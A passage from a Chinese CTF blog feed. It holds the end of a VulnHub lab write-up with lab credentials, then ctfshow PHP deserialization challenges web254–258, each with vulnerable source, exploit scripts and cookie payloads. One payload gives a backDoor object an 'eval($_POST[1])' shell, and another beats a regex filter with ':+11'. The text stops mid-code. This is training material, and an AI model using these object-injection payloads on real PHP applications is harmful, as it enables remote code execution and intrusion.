href="#附录">¶</a>附录</h2><p>信息收集总结如下</p><ul><li><p>目标kali: 192.168.56.6ubuntu:  192.168.56.101port: 25 80 55006 55007</p></li><li><p>域名<a href="http://severnaya-station.com">severnaya-station.com</a></p></li><li><p>账密web:boris : InvincibleHack3rnatalya : null</p><p>pop3:boris : secret1!natalya : birddoak : goat</p><p>web/gnocertdir :xenia : RCP90rulez!dr_doak : 4England!admin : xWinter1995x!</p></li><li><p>重要信息root中access code: 568628e0d993b1973adc718237da6e93</p></li><li><p>身份boris: user,员工natalya: GNO培训主管xenia: natalya学生, 网站账户doak: 员工,高管james: 特工</p></li><li><p>其他关联Janus: 犯罪集团</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 爆破 </tag>
            
            <tag> 提权 </tag>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_反序列化</title>
      <link href="/article/ctfshow-webbasic-unserialize/"/>
      <url>/article/ctfshow-webbasic-unserialize/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>反序列化</h1><hr><h2 id="web254"><a class="header-anchor" href="#web254">¶</a>web254</h2><ul><li>描述: 开始反序列化</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有魔术方法也没有反序列化函数, 直接输入<code>ctfShowUser</code>函数定义的username和password即可通过isVIP判断</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><h2 id="web255"><a class="header-anchor" href="#web255">¶</a>web255</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就算过了判断也没有将isVIP设定为true, 但是设置了cookie传值, 一样没有魔术方法</p><p>exp:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">// O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240823095722021.png" alt="image-20240823095722021"></p><h2 id="web256"><a class="header-anchor" href="#web256">¶</a>web256</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在函数中判断password和username不能相等, 但是通过反序列化我们可以控制函数中的变量, 我们可以通过自定变量通过函数内的判断</p><p>exp:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">?username=a&amp;password=b</span><br><span class="line">Cookie:</span><br><span class="line">user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure><h2 id="web257"><a class="header-anchor" href="#web257">¶</a>web257</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>似乎可以直接用backDoor执行命令, 甚至不需要登录成功, 存在即可</p><p>exp:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>传值一次后POST执行命令即可, 记得暂时关闭杀毒软件, 否则该php文件会被杀掉</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240823103802592.png" alt="image-20240823103802592"></p><h2 id="web258"><a class="header-anchor" href="#web258">¶</a>web258</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个正则表达式匹配以o或c(不区分大小写)开头, 紧接着是一个冒号, 然后是一个或多个数字, 最后又是一个冒号的字符串</p><p>怎么办呢, 增加一个加号在数字前面前面就行</p><blockquote><p>本题的<code>$code</code>变成了public, 不要傻乎乎的拿着上题的exp只增加替换</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>());</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:11&#x27;</span>,<span class="string">&#x27;:+11&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:8&#x27;</span>,<span class="string">&#x27;:+8&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240823111634401.png" alt="image-20240823111634401"></p><h2 id="web259"><a class="header-anchor" href="#web259">¶</a>web259</h2><ul><li>描述还挺多:</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="variable">$xff</span> = <span class="title function_ 